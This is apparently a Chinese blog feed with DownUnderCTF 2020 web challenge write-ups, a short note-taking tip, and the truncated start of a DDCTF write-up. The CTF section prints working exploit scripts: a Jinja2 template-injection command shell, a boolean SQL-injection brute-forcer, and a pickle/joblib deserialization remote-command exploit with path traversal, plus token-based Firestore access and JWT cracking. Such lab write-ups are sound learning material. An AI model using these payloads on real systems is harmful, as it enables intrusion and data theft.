        <content type="html"><![CDATA[<p>官方 writeup 地址：<a href="https://github.com/DownUnderCTF/Challenges_2020_public">https://github.com/DownUnderCTF/Challenges_2020_public</a><br>题目地址：<a href="https://play.duc.tf/challenges">https://play.duc.tf/challenges</a></p><hr><a id="more"></a><h1 id="Web-Badmin（DNS配置）"><a href="#Web-Badmin（DNS配置）" class="headerlink" title="Web Badmin（DNS配置）"></a>Web Badmin（DNS配置）</h1><p>题目：web badmin</p><p>提示：We launched a game and now it is no longer launched :( can you figure out what happened plox. HALP</p><p>视频上方：me rn。windows</p><p>注释：<code>&lt;!-- &lt;a href=&quot;https://epicgame.play.duc.tf&quot;&gt;Play our new game here!&lt;/a&gt; --&gt;</code>，注释中的网站无法打开</p><p>beep boop：哔哔声</p><p>没有cookie</p><p>hint：Boss: we are firing you. The game doesn’t even load. Web admin: it was just a simple misconfiguration, i clicked the wrong button 😞</p><p>发现注释中有提示信息，使用浏览器、ping工具、curl工具（几种常用的工具）都没有任何响应，束手无策。</p><p>最后查看题解才知道，无法连接是由于DNS的原因，使用dig、host即可获得flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">host -t txt epicgame.play.duc.tf</span><br><span class="line"></span><br><span class="line">dig epicgame.play.duc.tf TXT         <span class="comment"># dig 命令主要用来从 DNS 域名服务器查询主机地址信息。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 DNS 协议中有很多的资源协议类型，TXT 属于其中一种。</p><ul><li>A记录 - 保存域的IP地址的记录。</li><li>CNAME记录 - 将一个域或子域转发到另一个域，不提供IP地址。</li><li>MX记录 - 将邮件定向到电子邮件服务器。</li><li>TXT记录 - 允许管理员在记录中存储文本注释。</li><li>NS记录 - 存储DNS条目的名称服务器。</li><li>SRV记录 - 指定特定服务的端口。</li></ul><hr><h1 id="Robotsss（SSTI）"><a href="#Robotsss（SSTI）" class="headerlink" title="Robotsss（SSTI）"></a>Robotsss（SSTI）</h1><p>题目地址：<a href="https://chal.duc.tf:30106/">https://chal.duc.tf:30106/</a><br>Us robot devs use better templates than those stupid humans!</p><p>注册并登陆系统，可以得到两个提示信息。第一个信息暗示 humans.txt 中有其他信息（<code>dirsearch</code> 工具也可以扫到），第二个提示暗示 flag 位于 /s3cr3t_p4th/robot_fl4g.txt。在第一个提示的源码中有一串二进制码，解码可得 humen.txt（二进制转ascii），第二篇文章的二进制解码得 fl4g.txt。</p><p>根据第一个暗示我们找到另一个地址(<a href="https://chal.duc.tf:30106/4dm1n_Cr3ds)%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%BB%99%E5%87%BA%E4%B8%80%E6%AE%B5">https://chal.duc.tf:30106/4dm1n_Cr3ds)，这个地址给出一段</a> admin credit 为 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.</p><p>访问 humen.txt 地址发现一张图片，使用 <code>strings</code> 工具处理图片（<code>binwalk</code>、<code>foremost</code> 都测试过），得到一串二进制码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解码得到 admin:This-Is-The-Admin-Password-XD!，看上去很像是账号密码。</p><p>使用 admin 账号登陆成功。前几天做了很多命令注入的题目（<code>Python</code>、<code>Java</code>），以为这个题目还是命令注入，最后发现是模版注入。并且还在控制台发现：Werkzeug/0.16.0 Python/3.7.9。</p><p>测试代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;                  =&gt; jinja2 </span><br><span class="line">&#x27;a&#x27;&#x27;a&#x27;                   =&gt; shell </span><br><span class="line">&#x27;a&#x27;.length               =&gt; js </span><br><span class="line">len(&#x27;a&#x27;)                 =&gt; python </span><br><span class="line">&#x27;a&#x27;.charAt(0)            =&gt; java</span><br><span class="line"></span><br><span class="line">&#123;&#123;1+1&#125;&#125;                  =&gt; 模版注入</span><br></pre></td></tr></table></figure><p>最后根据漏洞特性构造 exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    get_para = <span class="string">&#x27;a=__class__&amp;&amp;b=__mro__&amp;&amp;c=__getitem__&amp;&amp;d=__subclasses__&amp;&amp;e=__init__&amp;&amp;f=__globals__&#x27;</span></span><br><span class="line">    <span class="comment"># get_para = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># post_para = input(&#x27;POST:&#x27;)</span></span><br><span class="line">    cmd = input(<span class="string">&#x27;cmd:&#x27;</span>)</span><br><span class="line">    post_para = <span class="string">&quot;&#123;&#123; &#x27;&#x27;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(1)|attr(request.args.d)()|attr(request.args.c)(127)|attr(request.args.e)|attr(request.args.f)|attr(request.args.c)(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;)|attr(&#x27;read&#x27;)() &#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    base_url = <span class="string">&#x27;https://chal.duc.tf:30106/admin.php?&#x27;</span> + get_para</span><br><span class="line"></span><br><span class="line">    resp = requests.post(</span><br><span class="line">        url=base_url,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;user_in&#x27;</span>: <span class="string">&#x27;&#x27;</span> + post_para + <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;.eJwlzjsOwjAMANC7eO5gO4kT9zJV4o9gbemEuDtIrG96bzjyjOsB--u8Y4Pj6bDDGNU4F7EnEkntWEiwhok3CfyJUS_ckigxQ1pxr5pNcxrqIp_K4itqFF02zSZLH73ZQPeCGD2YURZiGaJ1tjXWbEO465wFFTa4rzj_GYLPF1GiLjY.X2bocA.l7FpHpE9qJ_HHpRBtjQGgDwGd0Y&#x27;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(markup=resp.content, features=<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    print(<span class="string">f&#x27;result: <span class="subst">&#123;soup.find(<span class="string">&quot;p&quot;</span>).get_text()&#125;</span>&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功 getshell，并得到 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png"></p><p>官方题解：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss</a></p><p>通过题解可知，6zMLV46JRp6kAmTs3nx5AG4WJgYeY 为 <code>base58</code> 编码，可以通过 <code>&#123;&#123; config.items() &#125;&#125;</code> 查看系统配置信息，配置信息中的函数用于暗示该函数可以使用。还可以使用 Jinja 自带的语法（<code>&#123;&#123; getFile("/fl4g.txt") &#125;&#125;</code>）来读取 flag 文件。</p><hr><h1 id="Cookie-Clicker（逻辑漏洞）"><a href="#Cookie-Clicker（逻辑漏洞）" class="headerlink" title="Cookie Clicker（逻辑漏洞）"></a>Cookie Clicker（逻辑漏洞）</h1><ul><li>题目地址：<a href="https://cookie-clicker1.web.app/">https://cookie-clicker1.web.app/</a></li><li>官方题解：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md</a></li><li>题解地址：<a href="https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker">https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker</a></li></ul><p>Click da cookie and you get to increase da cookie. Built this using epic Firebase. Built this in a day HOW COOL is firebase! Didn’t need to worry about security because it’s all handled by Google :) just click cookies and enjoy</p><p>WriteUp：我从题目中提取到的关键词是 epic Firebase，Flag 可能和 Firebase 有关。将相关简单流程操作了一下，并未发现异常情况（看了一下请求参数，太复杂了）。题目中还涉及 Google，心生敬畏之心，简单查看源文件之后果断放弃（这种大型网站从来没做过。</p><p>查看题解过后发现第一步的思路是正确的，但是没有去搜索 Firebase。Firestore 是一个数据库服务，并且 WriteUp 提到「Firebase 有一个关键的安全问题——设置访问控制，否则任意用户都能访问数据」。</p><blockquote><p>note：大型服务商（Google）提供的服务通常的问题都出在配置问题。（不然早就修复了</p></blockquote><p>然后观察题目发送的请求（注意观察存在关键词的请求），第一次请求和后面的请求不相同，通常应该联想到第一次请求是在申请授权。按照 <a href="https://firebase.google.com/docs/firestore/use-rest-api">Cloud Firestore API</a> 的教程，使用申请授权的信息向 Firebase 进行验证即可得到 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -H <span class="string">&quot;Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjE1MDYzLCJ1c2VyX2lkIjoiRXVhUkdDU2t0R040Nnh0MWdBRUgzbEw5MkFyMSIsInN1YiI6IkV1YVJHQ1NrdEdONDZ4dDFnQUVIM2xMOTJBcjEiLCJpYXQiOjE2MDA2MTgzNjYsImV4cCI6MTYwMDYyMTk2NiwiZW1haWwiOiJrZWt3QGtla3cua2VrdyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJrZWt3QGtla3cua2VrdyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.cHgPEFjfZ0J408lkrRfow_3iIsiLYTd1EVIP28NSvj9ZQIKdY6sZtIJ7XPpeVCcxWcswx9tv4Ftv6uNkgF67HeAccyY7I9YwDQuhWrPIAGMNBbQ2qoq19YbpfLy_Ot-0LRE8z9jpPL8uwEDyy8vX_PPPZAmcFHX3nQe1ltvMWDLGVeIUP4F-tDtHX5NGL-UngGPvEAg6qfpzY5tax6NzPwi-HDRDLHLPa4ayiQurwAw2hs0CTOwvbMDjf8YzoNeL0fscukyOPsFZOw-0L0nQbO4FF0GdfZLLski4VvD0XK8N9lkc_Vtn0cqZ1bN3f7Sof28KAvNf5Is-_JnO6fxz1g&quot;</span> <span class="string">&quot;https://firestore.googleapis.com/v1/projects/cookie-clicker1/databases/(default)/documents/cookies&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方的 writeup 则是使用 firestore 在源码中搜索能找到登陆的关键凭证，但后面的步骤就很难联想到。（这个题脑洞是真滴大</p><hr><h1 id="CicleSpace（SQL注入）"><a href="#CicleSpace（SQL注入）" class="headerlink" title="CicleSpace（SQL注入）"></a>CicleSpace（SQL注入）</h1><ul><li>题目链接：<a href="https://chal.duc.tf:30103/">https://chal.duc.tf:30103/</a></li><li>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md</a></li></ul><p>Oh, how I miss /r/place and /r/circleoftrust. That’s why I decided to create my own one for y’all to play with.<br>/* some bruteforce may be required */</p><p>猜测为SQL注入，但是没有成功注入。发送空数据时，返回报错（400）。</p><p>查看题解后发现，fuzz SQL注入时，最好把自己写入的参数删掉（参数为空）。参考题解的 payload，添加名为 1 的 Person，然后再分别使用：<code>1&quot; AND 1=0  #</code>，<code>1&quot; AND 1=1  #</code> 进行查询，即可发现为 Boolean 注入，然后使用 Boolean 注入的方法进行爆破即可。（使用 <code>2&quot; # </code> 也能查出来）</p><blockquote><p>细心一点测试，这个题应该能做（</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">CHARSET = list(string.ascii_lowercase + string.digits) + [<span class="string">&#x27;\\_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="string">&#x27;\\_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">url: str, sql: str, result: list, charset=CHARSET, current=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        r = s.get(url, params=&#123;<span class="string">&quot;name&quot;</span>: sql.format(current + i + <span class="string">&quot;%&quot;</span>)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is not part&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            res = query(url, sql, result, charset=charset, current=current + i)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                result.append(current + i)</span><br><span class="line">    <span class="keyword">return</span> found</span><br><span class="line">      </span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="comment"># create a circle</span></span><br><span class="line">r = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/create&quot;</span>, data=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lol&quot;</span>&#125;)</span><br><span class="line">circle_url = r.url</span><br><span class="line"></span><br><span class="line"><span class="comment"># find the right table</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span>():</span></span><br><span class="line">    q = <span class="string">&#x27;&quot; AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type=&quot;BASE TABLE&quot; AND table_schema=&quot;circlespace&quot; AND table_name LIKE &quot;&#123;&#125;&quot; -- a&#x27;</span></span><br><span class="line">    tables = []</span><br><span class="line">    query(<span class="string">f&quot;<span class="subst">&#123;circle_url&#125;</span>/people&quot;</span>, q, tables)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line">print(get_tables())</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="Taking-Stock（Python序列化）"><a href="#Taking-Stock（Python序列化）" class="headerlink" title="Taking Stock（Python序列化）"></a>Taking Stock（Python序列化）</h1><p>题目地址：<a href="https://chal.duc.tf:30104/">https://chal.duc.tf:30104/</a></p><p>After taking one unit of AI at uni I’m now a pro. My linear regression model is amazing at predicting the stock market. I’m so proud of it I’m even offering it as a service. Can’t wait to get that VC money!</p><p>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock</a></p><p>登陆后可以发现，Profile Picture 泄漏了 uuid。解码 session 后获得 <code>&#123;&quot;id&quot;:&quot;74795b25-010e-4fca-9e7b-ae05a000d089&quot;,&quot;username&quot;:&quot;1&quot;&#125;_q?G??&#39;1v8aF??j?????&gt;p?4</code>。和图片的 uuid（<code>&lt;img src=&quot;/profile-picture/74795b25-010e-4fca-9e7b-ae05a000d089&quot; alt=&quot;Profile Picture&quot;&gt;</code>） 相同。</p><p>在 stock 位置有目录穿越，也就意味着 joblib 反序列时，可以指定为自己上传的文件。</p><p>基本思路：构建 payload（命令执行结果写回文件） -&gt; 命令序列化后存入文件 -&gt; 将文件做为头像传入系统 -&gt; 在 stock 处反序列化上传的文件 -&gt; 读取头像。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64Padding</span>(<span class="params">data</span>):</span></span><br><span class="line">    missing_padding = <span class="number">4</span> - len(data) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding:</span><br><span class="line">        data += <span class="string">&#x27;=&#x27;</span> * missing_padding</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">REMOTE = <span class="string">&#x27;https://chal.duc.tf:30104/&#x27;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 登陆</span></span><br><span class="line">resp = session.post(<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/login&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;hacker&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2。 获取 Cookie</span></span><br><span class="line">token = json.loads(</span><br><span class="line">    b64.b64decode(base64Padding(session.cookies[<span class="string">&#x27;session&#x27;</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])).decode()</span><br><span class="line">)</span><br><span class="line">uid = token[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">resp = session.get(<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="subst">&#123;uid&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">remote_path = resp.text.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">-1</span>].replace(<span class="string">f&#x27;<span class="subst">&#123;uid&#125;</span>.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>).rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(remote_path)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_payload</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    payload = <span class="string">f&#x27;<span class="subst">&#123;cmd&#125;</span> &gt; <span class="subst">&#123;remote_path&#125;</span>/<span class="subst">&#123;uid&#125;</span>.png&#x27;</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (payload,))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Model()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="comment"># 将 payload 序列化后写入文件。</span></span><br><span class="line">    tmpfile = io.BytesIO()</span><br><span class="line">    joblib.dump(make_payload(cmd), tmpfile)</span><br><span class="line">    tmpfile.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># session 上传文件</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/profile-picture&#x27;</span>,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;img&#x27;</span>: (<span class="string">&#x27;1.png&#x27;</span>, tmpfile)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定位问题的位置</span></span><br><span class="line">    <span class="keyword">assert</span> resp.ok</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使运行文件中序列化的命令</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/predict&#x27;</span>,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;stock&#x27;</span>: <span class="string">&#x27;../&#x27;</span> * <span class="number">16</span> + <span class="string">f&#x27;<span class="subst">&#123;remote_path&#125;</span>/<span class="subst">&#123;uid&#125;</span>.png&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;prices&#x27;</span>: <span class="string">&#x27;1,2&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取命令执行的结果</span></span><br><span class="line">    resp = session.get(<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="subst">&#123;uid&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input()</span><br><span class="line">    print(exec_cmd(cmd))</span><br><span class="line">    print(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="Design-COMP"><a href="#Design-COMP" class="headerlink" title="Design COMP"></a>Design COMP</h1><p>题目链接：<a href="https://chal.duc.tf:30105/">https://chal.duc.tf:30105/</a></p><p>Come join our homepage design competition and test out your CSS skills!<br>Snippet of admin code: <a href="https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da">https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da</a></p><p>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决印象笔记粘贴代码缩进混乱的问题</title>
      <link href="524edff2bb56/"/>
      <url>524edff2bb56/</url>
      
        <content type="html"><![CDATA[<p>从网页中粘贴代码到印象笔记经常会出现缩进失效.</p><a id="more"></a><ul><li><p>使用 Ctrl + V 直接进行粘贴的结果。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095549.png"></p></li><li><p>先粘贴到 VScode，再复制 vscode 中的代码进行粘贴(可是我不想再打开 vscode)<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095611.png"></p></li><li><p>使用 Alfred 的剪贴板，得到的结果和 vscode 相同。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年9月DDCTF题解</title>
      <link href="2e403dc6e029/"/>
      <url>2e403dc6e029/</url>
      
        <content type="html"><![CDATA[<p>挺难的（</p><a id="more"></a><h1 id="web：web签到题"><a href="#web：web签到题" class="headerlink" title="web：web签到题"></a>web：web签到题</h1><p>个人觉得挺难的，只做出来一道题，而且这道题需要 pwn 和 web 相结合。</p><h2 id="步骤1：JWT绕过"><a href="#步骤1：JWT绕过" class="headerlink" title="步骤1：JWT绕过"></a>步骤1：JWT绕过</h2><p>图1:题目给定初始条件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233709.png"></p><p>向 api 发送请求，得到响应如下，data 的数据格式和 jwt 相似，猜测为 jwt 绕过。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;code&quot;</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">&quot;message&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line"><span class="attr">&quot;data&quot;</span>: <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InN0ciIsInB3ZCI6InN0ciIsInVzZXJSb2xlIjoiR1VFU1QiLCJleHAiOjE1OTkyODY0NzB9.z-i_zjudu5yejiFbCnE9P5NIjOJE61Bzpw75OX1SHmg&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我只做过一次 JWT 绕过的题目，并且当时记笔记的习惯不好，早已忘记。于是先查询了一下 <a href="evernote:///view/24913208/s27/10cd3f6d-645f-475a-a439-8efbdaba360c/10cd3f6d-645f-475a-a439-8efbdaba360c/">JWT 相关原理和基本步骤</a>，初略指导该漏洞可以使用 5 种方式进行攻击。考虑从最简单的暴力破解 key 开始尝试，使用 <a href="https://delcoding.github.io/2018/03/jwt-bypass/">Junay 大佬博客</a>推荐的<a href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>进行尝试，爆破出密码为 str（不同的人密码可能不同），然后到 <a href="https://jwt.io/">https://jwt.io/</a> 进行 jwt 伪造，将伪造后的 jwt 发送到 auth interface 得到 client 下载链接。</p><p>图2:爆破得到的密码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233726.png"></p><h2 id="步骤2：逆向绕过客户端"><a href="#步骤2：逆向绕过客户端" class="headerlink" 